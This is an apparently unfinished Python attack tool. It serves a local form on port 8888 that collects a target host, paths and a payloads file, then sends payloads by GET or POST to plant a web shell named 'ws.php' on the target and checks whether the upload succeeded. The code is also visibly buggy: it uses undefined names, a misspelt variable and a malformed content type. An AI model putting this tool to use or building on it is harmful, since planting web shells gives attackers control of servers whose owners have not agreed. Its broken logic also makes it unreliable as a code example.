########################################################## STILL UNDER DEVELOPEMENT ###################################################################################

import socket
import urllib.parse
import threading

def shell_upload():
    server1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    global items
    isconnected=0
    try:
        server1.connect((items['host'],80))
        isconnected=1
    except:
        print("[*] Unable To Reach The Server : (")
        __import__('sys').exit()
    if isconnected:
        data=input("$ enter parameter name> ")
        method=input("$ set a method(default is GET) > ")
        if method=="":
            method="GET"
        server2.connect((items['host'],80))
        for index in items['path']:
            for payload in items['payloads']:
                paylaod=payload.format(index+'ws.php')
                if method=="GET":
                    query1=f'''GET /{items['host']}?{data}={urllib.parse.quote(payload)} HTTP/1.1\r\nHost:{items['host']}\r\nConnection: Close\r\n\r\n'''
                elif method=='POST':
                    query1=f'''POST /{items['host']} HTTP/1.1\r\nHost:{items['host']}\r\nContent-Length:{len(data+"="+urllib.parse.quote(payload))}\r\nContent-Type:application/x-www-urlencoded\r\nConnection: Close\r\n\r\n{data}={urllib.parse.quote(payload)}'''
                query2=f'GET /{index}'
                server1.send(bytes(query1,"us-ascii"))
                query2=f'GET /ws.php HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nConnection: Close\r\n\r\n'
                server2.send(bytes(query2,"us-ascii"))
                if '200 OK' in server2.recv(1024).decode('us-ascii').split('\r\n')[0]:
                    print('uploaded successfuly')
                    indexlist.close()
                    wordlist.close()
                    break

main_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
main_server.bind(("localhost",8888))
main_server.listen(1)
print('[*] server is running on port 8888')
while True:
    conn,addr=main_server.accept()
    body='''HTTP/1.0 OK\r\nConnection: Close\r\n\r\n
    <!DOCTYPE HTML>
    <form action="/" method="GET" style='font-family=helvetica;align:center'>
    <input name="path" placeholder="path"><br>
    <input name="host" placeholder="host"><br>
    <input name="filename" placeholder="directionslist file path"><br>
    <input name="payloads" placeholder="payloads file path"><br>
    <input type="submit" value="exploit"></form>'''
    first_line=conn.recv(2048).decode('us-ascii').split('\r\n')[0] #/?path=/index&host=domain&filename=c:/wordlist&payloads+path=idk
    data=urllib.parse.unquote(first_line).replace('GET ','').replace('HTTP/1.1','').replace(' ','').replace('/?','').split("&")
    for item in data:
        if 'path=' in item:
            path=item.replace('path=','')
        if 'host=' in item:
            host=item.replace('host=','')
        if 'filename=' in item:
            filename=item.replace('filename=','')
        if 'payloads=' in item:
            payloads=item.replace('payloads=','')
            items={"payloads":payloads,"filename":filename,"path":path,"host":host}
            print(items)
    shell_upload()
    conn.send(bytes(body,"us-ascii"))
                                          ##############################################################
